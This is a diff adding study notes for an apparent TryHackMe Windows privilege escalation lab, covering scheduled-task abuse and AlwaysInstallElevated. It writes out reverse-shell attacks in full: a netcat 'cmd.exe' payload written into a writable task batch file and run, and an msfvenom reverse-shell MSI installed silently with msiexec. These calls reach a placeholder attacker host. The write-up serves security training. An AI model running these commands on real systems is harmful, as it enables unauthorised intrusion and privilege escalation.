@@ -193,6 +193,94 @@
 > Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access.
 >
 > # A. Scheduled Tasks
->> 
+> Some scheduled task might either lost its binary or it's using a binary you can modify.
+>
+> Scheduled tasks can be listed from the command line using the `schtasks` command without any options.
+>
+> To retrieve more detailed information about any of the services you can type
+> ```
+> C:\> schtasks /query /tn vulntask /fo list /v
+> Folder: \
+> HostName:                             THM-PC1
+> TaskName:                             \vulntask
+> Task To Run:                          C:\tasks\schtask.bat
+> Run As User:                          taskusr1
+> ```
+> ### Two Important Parameters:
+>> - **Task to Run** = indicates what gets executed by the scheduled task
+>> - **Run As User** = shows the user that will be used to execute the task
+>
+> If modifiable, we can control what gets executed by the taskuser1, resulting in a simple privilege escalation.
+> 
+> Use `icacls` to check permissions on the executable:
+> ```
+> C:\> icacls c:\tasks\schtask.bat
+> c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+>                     BUILTIN\Administrators:(I)(F)
+>                     BUILTIN\Users:(I)(F)
+> ```
+> The **BUILTIN/Users** group has full access (F) over the task's binary. That means we can modify the .bat file and insert any payloads we like.
+>
+> ## ATTACKER MACHINE:
+>> ```
+>> root@ip-10-10-107-180:~# nc -lvp 4444
+>> ```
+>
+> ## TARGET MACHINE:
+>> ```
+>> C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe <ATTACKER-IP> 4444 > C:\tasks\schtask.bat
+>>
+>> C:\Users\thm-unpriv>schtasks /run /tn vulntask
+>> SUCCESS: Attempted to run the scheduled task "vulntask".
+>> ```
+>
+> ## ATTACKER MACHINE:
+>> ```
+>> root@ip-10-10-107-180:~# nc -lvp 4444
+>> Listening on 0.0.0.0 4444
+>> Connection received on 10.10.89.191 49907
+>> Microsoft Windows [Version 10.0.17763.1821]
+>> (c) 2018 Microsoft Corporation. All rights reserved.
+>>
+>> C:\Windows\system32>whoami
+>> wprivesc1\taskusr1
+>>
+>> C:\Windows\system32>more C:\Users\taskuser1\Desktop\flag.txt
+>> // RETRIEVE FLAG
+>> ```
+>
+> # B. AlwaysInstallElevated
+> Windows installer files (.msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it.
+>
+> However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
+>
+>> **NOTE:** The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.
+> 
+> This method required two registry values to be set. Otherwise, exploitation will not be possible. You can query these from the command line using the commands below:
+>> ```
+>> C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+>> C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+>> ```
+>
+> After setting the two, you can generate a malicious .msi file using `msfvenom`, as seen below:
+> ```
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+> ```
+> As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
+> ```
+> C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+> ```
   
 </details>
+
+<details> 
+<summary><h2> 3. Abusing Service Misconfigurations </h2></summary>
+
+> # Windows Services
+> Window servies are managed by the **Service Control Manager (SCM)**. Its in charge of managing the state of service as needed, checking the current status of any given service and generally providing a way to configure services.
+>
+> 
+
+</details>
+
+
